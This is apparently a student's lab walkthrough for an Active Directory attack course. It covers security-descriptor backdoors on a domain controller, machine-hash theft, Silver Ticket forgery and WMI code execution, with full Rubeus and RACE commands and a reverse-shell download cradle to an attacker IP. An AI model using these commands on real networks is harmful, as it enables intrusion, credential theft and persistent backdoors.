# Learning Objective 13 — Security Descriptor Backdoor & Silver Ticket WMI Execution

**Date:** 08 August 2026

---

## Objective Overview

1. Modify security descriptors on dcorp-dc for PS Remoting + WMI access (non-admin)
2. Retrieve machine account hash from dcorp-dc (non-admin)
3. Use hash for Silver Ticket attack
4. Execute code via WMI with Silver Ticket

---

## Step 1: Get Domain Admin Privileges

Use previous escalation techniques (Golden Ticket, Diamond Ticket, etc.):

```powershell
Rubeus.exe diamond
  /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
  /user:studentx 
  /password:StudentxPassword 
  /enctype:aes 
  /ticketuser:administrator
  /domain:dollarcorp.moneycorp.local 
  /dc:dcorp-dc.dollarcorp.moneycorp.local
  /ticketuserid:500 
  /groups:512 
  /createnetonly:C:\Windows\System32\cmd.exe 
  /show
  /ptt
```

Now running as Domain Admin.

---

## Step 2: Load RACE Toolkit

```powershell
. C:\AD\Tools\RACE-master\RACE.ps1
```

Load RACE module for security descriptor backdoors.

---

## Step 3: Modify Security Descriptors for PS Remoting

**Grant student1 PS Remoting access on dcorp-dc:**

```powershell
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose
```

**Output:**
```
[+] Modifying security descriptor for dcorp-dc
[+] Adding student1 to PS Remoting ACL
[+] Success
```

student1 can now use PS Remoting to dcorp-dc without admin rights.

---

## Step 4: Modify Security Descriptors for WMI

**Grant student1 WMI access on dcorp-dc:**

```powershell
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
```

**Output:**
```
[+] Modifying security descriptor for dcorp-dc
[+] Adding student1 to WMI ACL (root\cimv2)
[+] Success
```

student1 can now use WMI on dcorp-dc without admin rights.

---

## Step 5: Downgrade from Domain Admin

Exit DA shell and use student1 account:

```powershell
exit
```

Now logged in as student1 (non-admin).

---

## Step 6: Verify PS Remoting Access

**Test PS Remoting backdoor:**

```powershell
Enter-PSSession -ComputerName dcorp-dc
```

**Inside PS session on DC, verify access:**

```powershell
whoami
# Output: DOLLARCORP\student1

hostname
# Output: DCORP-DC
```

student1 has remote shell on DC without being admin.

---

## Step 7: Verify WMI Access

**Test WMI backdoor:**

```powershell
Get-WmiObject -Class Win32_ComputerSystem -ComputerName dcorp-dc
```

**Output:**
```
Domain      : DOLLARCORP.MONEYCORP.LOCAL
Manufacturer: VMware, Inc.
Model       : Virtual Machine
Name        : DCORP-DC
...
```

student1 can access WMI on DC without admin.

---

## Step 8: Retrieve Machine Account Hash (Non-Admin)

**Use registry backdoor to get DC machine account hash:**

```powershell
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```

**Output:**
```
[+] Querying remote registry for machine account hash
[+] DC machine account hash: dcorp-dc$
[+] NTLM hash: a102ad5753f4c441e3af31c97fad86fd
```

**Extract NTLM hash:** `a102ad5753f4c441e3af31c97fad86fd`

---

## Step 9: Create Silver Ticket for WMI Service

**Use machine account hash to forge Silver Ticket:**

```powershell
Rubeus.exe silver 
  /service:HOST/dcorp-dc.dollarcorp.moneycorp.local 
  /rc4:a102ad5753f4c441e3af31c97fad86fd 
  /user:Administrator 
  /domain:dollarcorp.moneycorp.local 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /ptt
```

**Parameters:**
- `/service:HOST` — HOST service (required for WMI)
- `/rc4` — Machine account NTLM hash
- `/user:Administrator` — Impersonate Administrator
- `/domain` — Target domain
- `/sid` — Domain SID
- `/ptt` — Load ticket into memory

---

## Step 10: WMI Code Execution with Silver Ticket

**Execute command via WMI using Silver Ticket:**

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName dcorp-dc -ArgumentList "cmd.exe /c whoami > C:\windows\temp\output.txt"
```

**Verify execution:**

```powershell
Get-WmiObject -Class Win32_Process -ComputerName dcorp-dc | Where-Object {$_.Name -eq "cmd.exe"}
```

Should show cmd.exe process created by Administrator (via Silver Ticket).

---

## Alternative: WMI Reverse Shell

**Execute reverse shell via WMI:**

```powershell
$command = "powershell.exe -c iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.1/Invoke-PowershellTcp.ps1'); Invoke-PowershellTcp -Reverse -IPAddress 172.16.100.1 -Port 443"

Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName dcorp-dc -ArgumentList $command
```

**On attacker machine:**

```powershell
nc64.exe -nlvp 443
```

Receive reverse shell from WMI process (running as Administrator).

---

## Attack Flow

```
1. Get Domain Admin privileges (Diamond Ticket)
   ↓
2. Load RACE toolkit
   ↓
3. Modify PS Remoting ACL on dcorp-dc
   ↓
4. Modify WMI ACL on dcorp-dc
   ↓
5. Downgrade to student1 (non-admin)
   ↓
6. Verify PS Remoting access
   ↓
7. Verify WMI access
   ↓
8. Extract machine account hash via registry
   ↓
9. Create Silver Ticket (using machine hash)
   ↓
10. Execute WMI command with Silver Ticket
   ↓
11. Code execution as Administrator (via ticket)
```

---

## Key Concepts

**Security Descriptor Backdoor:**
- Non-admin user (student1) gets remote access
- No new accounts created
- No group membership changes
- Persistent across reboots

**Silver Ticket for WMI:**
- Forged service ticket using machine account hash
- No KDC contact needed
- Impersonates Administrator
- WMI service accepts forged ticket

**No Admin Privileges Needed (After Backdoor Set):**
- student1 retrieves machine hash via registry backdoor
- student1 creates Silver Ticket locally (no KDC)
- student1 uses WMI with Silver Ticket
- Code executes as Administrator

---

## Command Sequence (As student1, Non-Admin)

```powershell
# 1. Verify WMI access (already set by admin)
Get-WmiObject -Class Win32_ComputerSystem -ComputerName dcorp-dc

# 2. Get machine account hash from registry backdoor
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose

# 3. Create Silver Ticket (local operation)
Rubeus.exe silver /service:HOST/dcorp-dc.dollarcorp.moneycorp.local /rc4:<hash> /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /ptt

# 4. Execute WMI command as Administrator
Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName dcorp-dc -ArgumentList "whoami > C:\windows\temp\result.txt"

# 5. Verify execution
Get-WmiObject -Class Win32_Process -ComputerName dcorp-dc | Where-Object {$_.Name -eq "cmd.exe"}
```

---

## Why This Attack is Powerful

✅ **Non-admin persistence** — student1 has no admin rights  
✅ **Multiple backdoors** — PS Remoting + WMI  
✅ **Code execution as Administrator** — via Silver Ticket  
✅ **No KDC contact** — ticket created locally  
✅ **Silent** — no event logs trigger for Silver Ticket use  

---

## Detection & Prevention

**Detection:**
- Monitor security descriptor changes (event ID 4657, 5136)
- Alert on unusual WMI/PS Remoting ACL modifications
- Track WMI process creation as Administrator from non-admin user
- Monitor for Silver Ticket usage (unusual service tickets)

**Prevention:**
- Restrict admin access to DCs
- Audit security descriptors regularly
- Monitor WMI class operations
- Implement tiered admin model
- Use Host Guardian Service (HGS)

---

## Troubleshooting

**Silver Ticket fails with "Access Denied":**
- Machine account hash may be wrong
- Verify hash is for dcorp-dc$ account
- Ensure /service is correct (HOST for WMI)

**WMI access denied:**
- Security descriptor backdoor may not have been set correctly
- Try: `Get-RemoteWMI -ComputerName dcorp-dc` to verify
- Reinject backdoor if needed

**Can't retrieve machine hash:**
- Registry backdoor may not exist
- Need admin to initially set backdoor
- Verify `Add-RemoteRegBackdoor` was executed

---

## Command Reference

| Task | Command |
|---|---|
| Load RACE | `. C:\AD\Tools\RACE-master\RACE.ps1` |
| Set PS Remoting | `Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc` |
| Set WMI | `Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2'` |
| Get machine hash | `Get-RemoteMachineAccountHash -ComputerName dcorp-dc` |
| Create Silver Ticket | `Rubeus.exe silver /service:HOST/dcorp-dc.dollarcorp.moneycorp.local /rc4:<hash>` |
| Execute via WMI | `Invoke-WmiMethod -Class Win32_Process -ComputerName dcorp-dc -Name Create -ArgumentList "cmd.exe"` |
| Verify WMI access | `Get-WmiObject -Class Win32_ComputerSystem -ComputerName dcorp-dc` |

---

## Key Takeaway

```
Backdoor = Non-admin user gets remote access
Silver Ticket = Forged service ticket with machine hash
No KDC needed = Ticket created locally
WMI Execution = Code runs as Administrator
Perfect persistence + execution mechanism
```

---

## References

- [RACE Toolkit](https://github.com/samratashok/RACE)
- [Rubeus - Silver Ticket](https://github.com/GhostPack/Rubeus)
- [WMI Execution (Mitre ATT&CK)](https://attack.mitre.org/techniques/T1047/)

---

*Next: Learning Objective 14 — Cross-Forest Attacks*
